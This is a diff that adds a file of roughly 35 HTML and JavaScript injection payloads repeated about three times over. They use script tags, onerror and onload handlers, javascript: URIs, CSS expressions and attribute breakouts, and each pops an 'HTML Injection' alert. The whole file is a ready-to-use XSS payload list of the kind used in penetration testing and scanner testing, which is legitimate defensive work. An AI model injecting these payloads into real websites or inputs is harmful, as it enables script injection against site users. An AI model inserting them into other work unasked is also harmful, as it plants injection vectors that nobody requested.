@@ -1,0 +1,100 @@
+<img src="x" onerror="alert('HTML Injection')">
+<script>alert('HTML Injection')</script>
+<a href="javascript:alert('HTML Injection')">Click Me</a>
+<iframe src="javascript:alert('HTML Injection')"></iframe>
+<div style="background-image: url(javascript:alert('HTML Injection'))"></div>
+<body onload="alert('HTML Injection')">
+<input type="text" value="<script>alert('HTML Injection')</script>">
+<textarea><script>alert('HTML Injection')</script></textarea>
+<marquee><script>alert('HTML Injection')</script></marquee>
+<svg/onload=alert('HTML Injection')>
+<img src=x onerror=alert('HTML Injection')>
+<script>document.write("HTML Injection");</script>
+<a href="javascript:document.write('HTML Injection')">Click Me</a>
+<input type="text" value="HTML Injection" onclick="alert('HTML Injection')">
+<textarea onclick="alert('HTML Injection')">Enter Text</textarea>
+"><script>alert('HTML Injection')</script>
+";alert('HTML Injection');"
+<img src=x onmouseover=alert('HTML Injection')>
+<body background='javascript:alert('HTML Injection')'>
+<a style="expression(alert('HTML Injection'))">Link</a>
+<input type="image" src="x" onerror="alert('HTML Injection')">
+<div style="width:expression(alert('HTML Injection'));">Content</div>
+<object data="javascript:alert('HTML Injection')"></object>
+<embed src="javascript:alert('HTML Injection')"></embed>
+<video><source onerror="javascript:alert('HTML Injection')"></video>
+<audio><source onerror="javascript:alert('HTML Injection')"></audio>
+<applet code="javascript:alert('HTML Injection')"></applet>
+<body style="background-image:url(javascript:alert('HTML Injection'))">
+<div style="background-image: url(javascript:alert('HTML Injection'));"></div>
+<style>body{background-image:url(javascript:alert('HTML Injection'))}</style>
+<iframe srcdoc="<script>alert('HTML Injection')</script>"></iframe>
+<input type="text" value="><script>alert('HTML Injection')</script>">
+<textarea><script>alert('HTML Injection')</script></textarea>
+<div style="background-image:url('javascript:alert('HTML Injection')')">
+<svg/onload=alert('HTML Injection')>
+<img src=x onerror=alert('HTML Injection')>
+<a href="javascript:alert('HTML Injection')">Click Me</a>
+<input type="text" value="<script>alert('HTML Injection')</script>">
+<textarea><script>alert('HTML Injection')</script></textarea>
+<marquee><script>alert('HTML Injection')</script></marquee>
+<img src=x onerror=alert('HTML Injection')>
+<script>document.write("HTML Injection");</script>
+<a href="javascript:document.write('HTML Injection')">Click Me</a>
+<input type="text" value="HTML Injection" onclick="alert('HTML Injection')">
+<textarea onclick="alert('HTML Injection')">Enter Text</textarea>
+"><script>alert('HTML Injection')</script>
+";alert('HTML Injection');"
+<img src=x onmouseover=alert('HTML Injection')>
+<body background='javascript:alert('HTML Injection')'>
+<a style="expression(alert('HTML Injection'))">Link</a>
+<input type="image" src="x" onerror="alert('HTML Injection')">
+<div style="width:expression(alert('HTML Injection'));">Content</div>
+<object data="javascript:alert('HTML Injection')"></object>
+<embed src="javascript:alert('HTML Injection')"></embed>
+<video><source onerror="javascript:alert('HTML Injection')"></video>
+<audio><source onerror="javascript:alert('HTML Injection')"></audio>
+<applet code="javascript:alert('HTML Injection')"></applet>
+<body style="background-image:url(javascript:alert('HTML Injection'))">
+<div style="background-image: url(javascript:alert('HTML Injection'));"></div>
+<style>body{background-image:url(javascript:alert('HTML Injection'))}</style>
+<iframe srcdoc="<script>alert('HTML Injection')</script>"></iframe>
+<input type="text" value="><script>alert('HTML Injection')</script>">
+<textarea><script>alert('HTML Injection')</script></textarea>
+<div style="background-image:url('javascript:alert('HTML Injection')')">
+<svg/onload=alert('HTML Injection')>
+<img src=x onerror=alert('HTML Injection')>
+<a href="javascript:alert('HTML Injection')">Click Me</a>
+<input type="text" value="<script>alert('HTML Injection')</script>">
+<textarea><script>alert('HTML Injection')</script></textarea>
+<marquee><script>alert('HTML Injection')</script></marquee>
+<img src=x onerror=alert('HTML Injection')>
+<script>document.write("HTML Injection");</script>
+<a href="javascript:document.write('HTML Injection')">Click Me</a>
+<input type="text" value="HTML Injection" onclick="alert('HTML Injection')">
+<textarea onclick="alert('HTML Injection')">Enter Text</textarea>
+"><script>alert('HTML Injection')</script>
+";alert('HTML Injection');"
+<img src=x onmouseover=alert('HTML Injection')>
+<body background='javascript:alert('HTML Injection')'>
+<a style="expression(alert('HTML Injection'))">Link</a>
+<input type="image" src="x" onerror="alert('HTML Injection')">
+<div style="width:expression(alert('HTML Injection'));">Content</div>
+<object data="javascript:alert('HTML Injection')"></object>
+<embed src="javascript:alert('HTML Injection')"></embed>
+<video><source onerror="javascript:alert('HTML Injection')"></video>
+<audio><source onerror="javascript:alert('HTML Injection')"></audio>
+<applet code="javascript:alert('HTML Injection')"></applet>
+<body style="background-image:url(javascript:alert('HTML Injection'))">
+<div style="background-image: url(javascript:alert('HTML Injection'));"></div>
+<style>body{background-image:url(javascript:alert('HTML Injection'))}</style>
+<iframe srcdoc="<script>alert('HTML Injection')</script>"></iframe>
+<input type="text" value="><script>alert('HTML Injection')</script>">
+<textarea><script>alert('HTML Injection')</script></textarea>
+<div style="background-image:url('javascript:alert('HTML Injection')')">
+<svg/onload=alert('HTML Injection')>
+<img src=x onerror=alert('HTML Injection')>
+<a href="javascript:alert('HTML Injection')">Click Me</a>
+<input type="text" value="<script>alert('HTML Injection')</script>">
+<textarea><script>alert('HTML Injection')</script></textarea>
+<marquee><script>alert('HTML Injection')</script></marquee>
